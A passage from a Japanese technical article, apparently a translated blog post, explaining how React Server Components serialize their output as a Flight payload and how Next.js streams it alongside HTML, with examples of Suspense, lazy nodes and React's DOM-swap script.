<p>筆者の簡単な関数の結果をシリアライズしたものが以下です。</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">"[\"$\",\"main\",null,{\"children\":[\"$\",\"h1\",null,{\"children\":\"understandingreact.com\"},\"$c\"]},\"$c\"]"</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>分析しやすいようにフォーマットしてみましょう（Alvar Lagerlöf氏が作成した<a href="https://github.com/alvarlagerlof/rsc-parser">RSCパーサー</a>を使用）。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>仮想DOMの構造が見えるでしょうか。<code class="language-text">main</code>要素と<code class="language-text">h1</code>要素、プレーンテキストノードもあります。props、特にReact特有の標準のchildren propsとして渡されているものも確認できます。</p>
<p>ここでは単純化した例を用いて説明していますが、フォーマットの要素はこれだけではありません。また、メタフレームワークを使用するとさらに多くの要素が追加されます。例えば、「Flight」を表す「f:」など、ツリーに追加するものを表す識別子などです。しかし、ここで必要な理解を得るためには単純化した例で十分です。</p>
<p>シリアライズのフォーマットはReactが提供していますが、Payloadを作成し、クライアントに送信する作業はメタフレームワーク（この場合はNext.js）が行う必要があります。</p>
<p>例えば、Next.jsはコードベースに<code class="language-text">generateDynamicRSCPayload</code>という関数があります。</p>
<p>メタフレームワークは、Payloadが確実に生成され、クライアントに送信されるようにします。Payloadのおかげで、Reactはクライアント上で正確な仮想DOMを構築し、差分検出処理を行うことができます。</p>
<h2>メタフレームワークとサーバーレンダリング</h2>
<p>先ほど、RSCからHTMLのレンダリングを行うことは「可能」だと話しました。そのように言ったのは、それが任意だからです。つまり、RSCからHTMLをレンダリングするかどうかはメタフレームワーク次第です。とは言え、そうすることは理にかなっています。</p>
<p>後で話すように、「体感パフォーマンス」は重要な指標です。すでにサーバー上でコードを実行していて、HTMLをストリーミングにより返せる場合、そうするべきです。なぜなら、ブラウザがそのHTMLを素早くレンダリングし、ユーザーの体感パフォーマンスが向上するからです。</p>
<p>メタフレームワークが遅いと感じられれば、誰も使いません。したがって、RSCを実装するReactのメタフレームワークは、古典的サーバーレンダリングとReactサーバーレンダリングの両方を行う必要があります。</p>
<p>古典的なサーバーレンダリング（HTMLを生成）ではページのレンダリング（ブラウザによる描画）が速く、Reactスタイルのサーバーレンダリング（RSC Payload）では後で行われるステートフルな更新のための仮想DOMが得られます。</p>
<p>したがって、実際にはRSCは「二重データ問題」を引き起こします。サーバーから同じ情報をHTMLとPayloadという2つの異なる形式で同時に送ることになります。これらはDOM（HTML）と仮想DOM（Payload）を即座に構築するために必要な情報です。</p>
<p>以下の図をご覧ください。</p>
<div class="video"><video loop autoplay muted playsinline aria-labelledby="video-label" src="https://tonyalicea.dev/assets/blogvideos/RSC_RSC.mp4"></video></div>
<p>例では、Next.jsがHTMLを返し、ブラウザはそれをもとにDOMを構築します。</p>
<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>understandingreact.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>さらにPayloadも返し、Reactはそれをもとに仮想DOMを構築します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>HTMLを送ることで、ブラウザがページを素早くレンダリングすることができます。ユーザーの画面には、ページが直ちに表示されます。また、Payloadを送ることで、Reactがページをインタラクティブにするために必要な作業を完了することができます。</p>
<p>このデータの重複に伴うコストは、サーバーがレスポンスを送る前に使う圧縮アルゴリズム（gzipなど）によって相殺できるという意見もあります。しかし、HTMLとJSONのようなPayloadは形式が異なるため、繰り返しの部分はあいまいになってしまい、帯域幅には二重データによる明らかな影響が生じます。</p>
<p>抽象化にはコストが伴います。ここでのコストは同じ情報を2回送る必要があることです。</p>
<p>これらのことを踏まえると、「レンダリング」の定義は全部で5つになります。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>レンダー【render】
【動詞】 /réndər/レンダリング</p><ol>
<li>（古典的クライアントサイド）DOMとCSSOMをもとにレイアウトを計算し、画面にピクセルを描画すること。</li>
<li>（Reactクライアントサイド）仮想DOMを構築して更新するために関数コンポーネントを実行すること。 </li>
<li>（古典的サーバーサイド）DOMを構築するためにクライアントに送信するHTMLを生成すること。</li>
<li>（ReactサーバーサイドSSR）DOMを構築するためにクライアントに送信するHTMLを生成するために関数コンポーネントを実行すること。</li>
<li>（ReactサーバーサイドRSC）仮想DOMを構築し、更新するためにクライアントに送るFlight（Payload）データを生成するために関数コンポーネントを実行すること。</li>
</ol></div></div>
<p>Reactの定義に共通する類似点にお気づきでしょうか。Reactでは、レンダリングは常に「関数コンポーネントの実行」を意味し、Client ComponentsとServer Componentsはいずれも仮想DOMの構築と更新に必要なものを提供します。</p>
<h2>Streams、Suspense、RSC</h2>
<p>アプリケーションを構築する際にはパフォーマンスが常に懸念点となります。しかし、パフォーマンスには2種類あります。実際のパフォーマンスと体感パフォーマンスです。</p>
<p>HTTPとブラウザは、両方のパフォーマンスを改善する方法として、長年ストリーミングをサポートしてきました。NodeJSの<a href="https://nodejs.org/en/learn/modules/how-to-use-streams">Stream API</a>や、ブラウザの<a href="https://developer.mozilla.org/en-US/docs/Web/API/Streams_API">Streams API</a>（特に、ブラウザの<a href="https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream">ReadableStream</a>オブジェクト）などです。</p>
<p>React（およびRSCをサポートしたいメタフレームワーク）は、これらのコアテクノロジーを利用してHTMLとPayload両方のデータをストリーミングします。ストリーミングとは、「チャンク」と呼ばれる少量のデータに分けて送信することを意味します。クライアントは、その少量のデータを受け取ったものから順に処理することができます。
したがって、ストリーミングの場合は「何を送ったか」ではなく、「一定時間内に何を送ったか」が問題となります。</p>
<p>ブラウザは、ネットワークを介したHTMLのストリーミングに対応できるよう設計されています。ストリーミングで送られてくるHTMLを受け取りながらページのレンダリング（配置と描画）を行います。</p>
<p>同様に、Reactは後に解決してRSC PayloadデータになるPromiseを受け入れます。例えば、Next.jsはクライアント上にReadableStreamを設定し、サーバーからのストリームを読み込み、受け取ったものからReactに渡します。サーバーレンダリングに対するReactの全体的なアプローチとしては、必要な場所にコンテンツをストリーミングで送る方式が中心となっています。</p>
<p>実際、Flight形式自体に未完了の処理を示すマーカーが含まれています。Promiseや遅延読み込みなどです。</p>
<p>例えば、サーバーコンポーネントをasync関数として設定し、タイマーを待つとします。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// components/Delayed.js</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">DelayedMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2 second delay</span>
    
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">This message was loaded after a 5 second delay!</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// page.js</span>
<span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>async関数はPromiseを返します。その結果、Payloadは以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
    <span class="token punctuation">}</span>
   <span class="token punctuation">]</span>
  <span class="token punctuation">}</span> 
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">DelayedMessage</code>コンポーネントがあるべき場所が、特別な識別子”L”でマーキングされている点に注目してください。これは、後でコンテンツが挿入される場所を示しているのです。</p>
<p>このコードを実行すると、遅延メッセージだけでなく、ページ全体が読み込まれるのに5秒かかります。</p>
<p>これは、Reactがクライアント向けに設計された特別な<code class="language-text">Suspense</code>機能を使用してPromiseや遅延読み込みに対処するためです。コンポーネントを更新して<code class="language-text">Suspense</code>を使うようにすると、以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Suspense <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Suspense</span></span> <span class="token attr-name">fallback</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Suspense</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>この状態でページを実行すると、最初にフォールバックが表示され、遅れているメッセージが5秒後に表示されます。しかし、このコンポーネントがまだサーバー上で実行されていることに注目してください。どうすればサーバー上で<code class="language-text">Suspense</code>を使えるのでしょうか。使えません。関数から返されたPayloadをクライアント上で処理すると、境界を含む仮想DOMが構築されます。</p>
<p>Payloadは以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Reference"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"fallback"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Loading..."</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>フォールバック（props）と、Promiseが解決した後で読み込まれるもの（「遅延ノード（Lazy node）」、この場合は<code class="language-text">DelayedMessage</code>）がいずれも含まれていることに注目してください。</p>
<p>Payloadは、チャンク化してストリーミングするとともに、Promiseが後で解決される仮想DOMの場所を参照します。そうすることで、Reactと、RSCをサポートするメタフレームワークは、最短時間でUIを表示し、実際のパフォーマンスとユーザーの体感パフォーマンスのいずれも改善しようとしています。</p>
<p>しかし、ストリーミングされたFlightデータはどこに送られるのでしょうか。Reactコードベース内のどこかであるはずです。</p>
<h2>ReactにPayloadを渡す</h2>
<p>RSCをサポートするために、ReactはFlight形式（文字列）を受け取り、<code class="language-text">parseModelString</code>などの関数でReact要素に変換する機能をコードベースに追加しました。</p>
<p>適切なデータを送信し、これらのReact APIを実行するかどうかはRSCをサポートするメタフレームワーク次第です。</p>
<p>例えば、Next.jsの場合は、アプリにラッピングコンポーネントを追加し、そこにPayloadデータをストリーミングにより送信します。</p>
<p>これは以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ServerRoot</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">AppRouter</span></span>
      <span class="token attr-name">actionQueue</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>actionQueue<span class="token punctuation">}</span></span>
      <span class="token attr-name">globalErrorComponentAndStyles</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>initialRSCPayload<span class="token punctuation">.</span><span class="token constant">G</span><span class="token punctuation">}</span></span>
      <span class="token attr-name">assetPrefix</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>initialRSCPayload<span class="token punctuation">.</span>p<span class="token punctuation">}</span></span>
  <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">ServerRoot</span></span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Next.jsは、コンポーネントツリーの<code class="language-text">AppRouter</code>の上に、<code class="language-text">ServerRoot</code>というコンポーネントを追加します。そこから<code class="language-text">AppRouter</code>にRSC Payloadデータをストリーミングします。</p>
<p>そのデータは、最終的にReactのPromiseベースのAPI（Flight形式を受け取るためのAPI）にストリーミングされます。</p>
<p>このように、ReactはPayloadをもとに仮想DOMを構築するためのAPIを提供し、Next.js（またはRSCをサポートするメタフレームワーク）には、サーバー上でコンポーネントが実行された後、そのデータをReactに渡す独自の仕組みが備わっています。</p>
<h2>順不同ストリーミング</h2>
<p>ストリーミングについて話すべき点は他にもあります。異なるコンポーネントの実行が異なるタイミングで完了する場合があります。チャンク化されたPayloadがストリーミングされてきたとき、Reactは仮想DOM（およびDOM）のどこにデータを置くべきかをどのようにして判断しているのでしょうか。</p>
<p><code class="language-text">DelayedMessage</code>コンポーネントを使用したDOMを再び見てみると、最初は以下のようになっています。</p>
<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>understandingreact.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!--$?--></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>B:0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Loading...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!--/$--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Reactは、特殊なIDが設定された<code class="language-text">template</code>のようなプレースホルダーと、<code class="language-text">Suspense</code>が待っているPromiseが解決した時点でのコンテンツの挿入先を記載したHTMLコメントを残します。</p>
<p>フォールバックはDOMの中にありますが、Promiseが解決すると新しいJavaScriptがページにストリーミングされてきます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token function-variable function">$RC</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  c <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  c<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      b <span class="token operator">=</span> a<span class="token punctuation">.</span>previousSibling<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span>
          b<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">"$!"</span><span class="token punctuation">,</span>
          a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"data-dgst"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
          e <span class="token operator">=</span> b<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>
          a <span class="token operator">=</span> b<span class="token punctuation">.</span>nextSibling<span class="token punctuation">;</span>
          <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">do</span> <span class="token punctuation">{</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> <span class="token number">8</span> <span class="token operator">===</span> a<span class="token punctuation">.</span>nodeType<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                  <span class="token keyword">var</span> d <span class="token operator">=</span> a<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"/$"</span> <span class="token operator">===</span> d<span class="token punctuation">)</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> f<span class="token punctuation">)</span>
                          <span class="token keyword">break</span><span class="token punctuation">;</span>
                      <span class="token keyword">else</span>
                          f<span class="token operator">--</span><span class="token punctuation">;</span>
                  <span class="token keyword">else</span>
                      <span class="token string">"$"</span> <span class="token operator">!==</span> d <span class="token operator">&amp;&amp;</span> <span class="token string">"$?"</span> <span class="token operator">!==</span> d <span class="token operator">&amp;&amp;</span> <span class="token string">"$!"</span> <span class="token operator">!==</span> d <span class="token operator">||</span> f<span class="token operator">++</span>
              <span class="token punctuation">}</span>
              d <span class="token operator">=</span> a<span class="token punctuation">.</span>nextSibling<span class="token punctuation">;</span>
              e<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
              a <span class="token operator">=</span> d
          <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> c<span class="token punctuation">.</span>firstChild<span class="token punctuation">;</span> <span class="token punctuation">)</span>
              e<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>firstChild<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
